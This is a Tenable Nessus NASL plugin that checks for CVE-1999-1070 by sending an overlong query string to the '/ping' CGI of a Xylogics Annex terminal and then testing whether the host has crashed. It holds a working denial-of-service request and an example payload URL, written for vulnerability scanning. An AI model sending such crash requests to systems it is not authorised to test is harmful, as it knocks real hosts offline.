#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10017);
 script_version ("$Revision: 1.33 $");
 script_cve_id("CVE-1999-1070");
 script_xref(name:"OSVDB", value:"9856");
 
 script_name(english:"Xylogics Annex Terminal Service ping CGI Program DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote Annex terminal by connecting to the 
HTTP port, and requesting the '/ping' CGI script with an argument that 
is too long. For example:

  http://www.example.com/ping?query=AAAAA(...)AAAAA" );
 script_set_attribute(attribute:"solution", value:
"Remove the '/ping' CGI script from your web server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:N/A:C" );

script_end_attributes();

 script_summary(english: "Crashes an Annex terminal");
 script_category(ACT_KILL_HOST);
 script_copyright(english: "This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_require_ports("Services/www", 80);
 script_dependencie("find_service1.nasl", "http_version.nasl", "no404.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);
if  (http_is_dead(port: port)) exit(0);

cgi = "/ping";
if (! is_cgi_installed3(item:cgi, port:port)) exit(0);

start_denial();
r = http_send_recv3(port: port, item: strcat(cgi, "?query=", crap(4096)), method: 'GET');
if (http_is_dead(port: port, retry: 3))
{
 alive = end_denial();
 if(!alive)
 {
   security_hole(port);
   set_kb_item(name:"Host/dead", value:TRUE);
 }
}
